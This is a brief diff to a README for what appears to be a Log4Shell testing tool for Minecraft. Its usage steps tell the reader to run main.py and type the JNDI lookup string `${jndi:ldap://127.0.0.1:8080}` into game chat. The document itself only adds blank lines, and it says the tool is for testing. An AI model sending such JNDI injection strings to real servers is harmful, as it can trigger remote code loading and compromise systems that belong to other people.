@@ -3,5 +3,7 @@ Don't use this maliciously, Just use this for testing Specifically for testing M
 
 # Usage:
 > [1] Run main.py 
+
 > [2] Type `${jndi:ldap://127.0.0.1:8080}` in your minecraft chat
+
 > [3] Done!
